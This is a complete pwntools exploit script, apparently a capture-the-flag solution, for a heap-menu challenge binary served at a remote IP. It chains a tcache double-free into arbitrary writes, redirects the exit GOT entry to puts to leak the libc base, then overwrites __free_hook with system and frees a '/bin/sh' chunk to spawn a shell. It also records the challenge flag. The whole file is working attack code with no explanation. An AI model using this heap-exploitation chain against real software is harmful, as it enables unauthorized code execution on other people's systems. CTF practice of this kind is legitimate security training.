#!/usr/bin/env python3
from pwn import *
# helper
def str2hex(str):
    return int('0x' + str.encode()[::-1].hex(), 16)

context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu'.split()
context.arch = 'amd64'
conn = 'nc 34.70.212.151 8001'.split()
host, port = conn[1], int(conn[2])
e = ELF('./chall')
lib = ELF('./libc-2.31.so', checksec=False)

script = """
b* 0x0000000004017C1
b* 0x000000000401812
b* 0x00000000040182A
b* 0x00000000040183D
c
"""

if args.REMOTE:
    p = remote(host, port)
elif args.GDB:
    p = gdb.debug(e.path, gdbscript=script, aslr=False)
else:
    p = process(e.path)

def new(idx, size):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'>> ', str(idx).encode())
    p.sendlineafter(b'>> ', str(size).encode())

def change_size(idx, size):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'>> ', str(idx).encode())
    p.sendlineafter(b'>> ', str(size).encode())

def free(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'>> ', str(idx).encode())
    
def edit(idx, data):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'>> ', str(idx).encode())
    p.sendlineafter(b'>> ', data)

def exit():
    p.sendlineafter(b'>> ', b'5')
    
use_chunk = 0x30
def write(addr, val):
    global use_chunk
    new(0, use_chunk)
    new(1, use_chunk)
    free(1)
    free(0)
    edit(0, b'a'*(0x20))
    free(0)
    new(0, use_chunk)
    edit(0, p64(addr))
    new(0, use_chunk)
    new(0, use_chunk)
    edit(0, p64(val))
    
    use_chunk += 0x10
    
exit_got = 0x403578
puts_got = 0x403530
puts_plt = 0x000000000401100
code = 0x0000000004035D0

write(exit_got, puts_plt)
write(code, puts_got)

# gdb.attach(p, gdbscript=script)
# pause()

exit()
p.recvline()
lib.address = u64(p.recv(6) + b'\x00'*2) - lib.sym.puts
info("lib.address " + hex(lib.address))

write(lib.sym.__free_hook, lib.sym.system)

new(0, use_chunk)
edit(0, b'/bin/sh')
free(0)

p.interactive()

# flag{St34l_l1bc_w17h_mun3y}